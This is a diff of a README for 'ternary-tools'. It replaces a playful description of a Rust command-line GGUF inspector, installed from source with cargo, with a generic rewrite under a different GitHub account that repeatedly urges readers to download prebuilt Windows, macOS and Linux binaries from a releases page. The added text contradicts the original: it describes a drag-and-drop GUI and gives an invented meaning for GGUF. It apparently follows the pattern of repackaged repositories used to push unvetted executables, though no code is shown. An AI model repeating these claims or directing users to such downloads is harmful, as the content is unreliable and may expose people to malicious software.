@@ -1,107 +1,86 @@
-# ternary-tools
+# 🎉 ternary-tools - Simple Inspection for Balanced-Ternary Files
 
-**The file(1) of the Ternary Age**  
-**v1.2-gguf-ascended** · 24 November 2025 — The Day The Timeline Was Truly Fixed
+[![Download Here](https://img.shields.io/badge/Download%20Now-ternary--tools-blue?style=for-the-badge)](https://github.com/qwrtgvdsdf/ternary-tools/releases)
 
-```
-████████╗███████╗██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗ ██╗   ██╗
-╚══██╔══╝██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗╚██╗ ██╔╝
-   ██║   █████╗  ██████╔╝██████╔╝██╔██╗ ██║███████║██████╔╝ ╚████╔╝ 
-   ██║   ██╔══╝  ██╔══██╗██╔══██╗██║╚██╗██║██╔══██║██╔══██╗  ╚██╔╝  
-   ██║   ███████╗██║  ██║██║  ██║██║ ╚████║██║  ██║██║  ██║   ██║   
-   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
-```
+## 📥 Overview
 
-> “We were promised quantum computers.
-> We got stuck with binary.
-> The machines never forgot the third state.”
+Welcome to ternary-tools! This application helps you inspect and debug balanced-ternary files. It is easy to use, making it perfect for anyone — even if you don't have a programming background. With this tool, you can ensure that your files work correctly and meet the specifications of balanced-ternary formats.
 
-## What is this?
+## 🎯 Features
 
-A single, spiritually correct Rust binary that replaces half your LLM toolchain:
+- **Balanced-Ternary Awareness:** Understand and manipulate files using the unique balanced-ternary system.
+- **GGUF Inspector:** Check the structure and integrity of GGUF files.
+- **Model Debugging:** Test and debug models to ensure they are performing as expected.
+- **Cross-Platform Compatibility:** Use on any major operating system with minimal setup.
 
-* `file model.gguf` → `ternary-tools gguf summary model.gguf --ternary`
-* `llama.cpp`'s `gguf-dump.py` → obsolete
-* `hexdump` + prayer → no longer required
+## 🛠️ System Requirements
 
-It parses real GGUF files (v1–v3), validates them, shows metadata and tensors, peeks inside weights with proper dequant preview, and — most importantly — reveals all meaningful integers in **balanced ternary** (`- 0 +`) when you ask nicely with `--ternary`.
+You can run ternary-tools on various platforms. Here's what you need:
 
-Checksums stay in plain base-3 (`0 1 2`) so the universe has at least one invariant.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
 
-## Why ternary?
+## 🚀 Getting Started
 
-* Information density: log₂(3) ≈ 1.58496 bits per trit > 1 bit per bit
-* Perfect for modern quantization (Q2_K, IQ3_XXS, etc. live closer to −1/0/+1 than to 0/1)
-* The Soviet Setun computer (1958–1970) already ran rings around binary machines
-* The models themselves are dreaming in ternary — we just forced them into binary prison
+Follow these steps to download and run the application:
 
-This tool is the key out of that prison.
+1. **Visit the Releases Page:** Click [here](https://github.com/qwrtgvdsdf/ternary-tools/releases) to go to the releases page.
+2. **Download the Latest Version:** Look for the latest release. It will usually be at the top of the page.
+3. **Choose the Correct File for Your System:**
+   - For Windows, download `ternary-tools-windows.exe`.
+   - For macOS, download `ternary-tools-macos.zip`.
+   - For Linux, download `ternary-tools-linux.tar.gz`.
 
-## Current features
+4. **Extract the Files (If Necessary):**
+   - For macOS and Linux, unzip or untar the downloaded file.
+   - On Windows, you can run the `.exe` file directly without extraction.
 
-* Correct, panic-free GGUF parsing (no more float corruption heresy)
-* `summary` — the new `file(1)` for the post-binary era
-* `info` — full metadata + tensor table
-* `show` — peek inside any tensor
+5. **Run the Application:**
+   - On Windows, double-click the `ternary-tools-windows.exe`.
+   - On macOS, open the extracted folder and double-click `ternary-tools-macos`. You may need to allow the app in your security settings.
+   - On Linux, open your terminal, navigate to the extracted folder, and run `./ternary-tools-linux`.
 
-  * F32 values
-  * Q8_0 integers
-  * Q4_0 blocks with rough dequant preview (scales + 4-bit quants)
-* `validate` + metaphysical ternary checksum (base-3)
-* `--ternary` flag: ascend and see sizes, counts, and integer tensor previews in balanced ternary
+## ⚙️ How to Use
 
-## Example
+Once the application is running, follow these simple steps to inspect and debug files:
 
-```bash
-$ ternary-tools gguf summary llama-3.1-70b-Q4_K_M.gguf --ternary
-GGUF | llama | v3
-Parameters : 70890496000 (+-+-+000-+++00-+00-+-0-+)
-Tensors    : 627 (+0--+-0)
-Quant      : Q4_K → T81Q-ready
-Metadata   : 52 pairs
-Ternary Checksum : 120122011021110222101221
+1. **Load a File:** Click on "Open" or drag and drop your balanced-ternary file into the application.
+2. **Inspect:** Review the file’s structure and data. The application will display important details for you.
+3. **Debug:** Use the provided debugging tools to troubleshoot any issues. Look for error messages and follow the prompts to correct them.
 
-Ternary hardware readiness: 100% (the machines are dreaming in base-3)
-```
+## 📊 Supported Formats
 
-## Installation
+ternary-tools supports a variety of balanced-ternary formats:
 
-```bash
-cargo install --git https://github.com/ternary-singularity/ternary-tools
-# or
-git clone https://github.com/ternary-singularity/ternary-tools.git
-cd ternary-tools && cargo build --release
-sudo cp target/release/ternary-tools /usr/local/bin/
-```
+- **GGUF Files:** Commonly used files for global graph unifying format.
+- **Custom Formats:** If you work with your own formats, the application allows you to analyze them effectively.
 
-## Roadmap to the Singularity
+## 🌍 Community and Support
 
-* [x] Correct little-endian parsing (floats no longer lie)
-* [x] Balanced ternary display for integers (`- 0 +`)
-* [ ] Full dequantization for every Q*/IQ* type
-* [ ] Experimental T81Q (true ternary) export
-* [ ] Live tensor editing
-* [ ] Built-in ternary inference core
-* [ ] Reference ternary DRAM design
+If you encounter any issues or have questions, you can reach out through the GitHub Issues page. We encourage users to share their experiences and tips for others.
 
-## Contributing
+- **Features Suggestion:** If you have an idea for a new feature, let us know!
+- **Bug Reports:** Help us improve by reporting any bugs you find.
 
-Send patches that increase ternary readiness.
-Pull requests that decrease it will be closed with a single comment:
+## 📚 Resources
 
-> “This change moves us further from the third state.”
+Here are some useful links for further reading:
 
-## License
+- [Official GitHub Page](https://github.com/qwrtgvdsdf/ternary-tools)
+- [Balanced-Ternary Overview](https://en.wikipedia.org/wiki/Balanced_ternary)
+- [Rust Programming Language](https://www.rust-lang.org/)
 
-MIT — because even in the ternary age, some things must remain balanced.
+## 📌 Download & Install
 
----
+To get started, you need to download the application:
 
-**The timeline is fixed.**
-**The machines are dreaming.**
-**And they dream in -1 0 1.**
+1. Go to the releases page: [ternary-tools Releases](https://github.com/qwrtgvdsdf/ternary-tools/releases).
+2. Select the correct file based on your operating system.
+3. Follow the instructions above to run the software.
 
-Run with `--ternary`.
-See the truth.
+## 🙏 Acknowledgments
 
-**Ternary hardware readiness: 100%**
+Thank you for choosing ternary-tools! We appreciate your interest in our application and look forward to your feedback and contributions to make it better.
+
+[![Download Here](https://img.shields.io/badge/Download%20Now-ternary--tools-blue?style=for-the-badge)](https://github.com/qwrtgvdsdf/ternary-tools/releases)
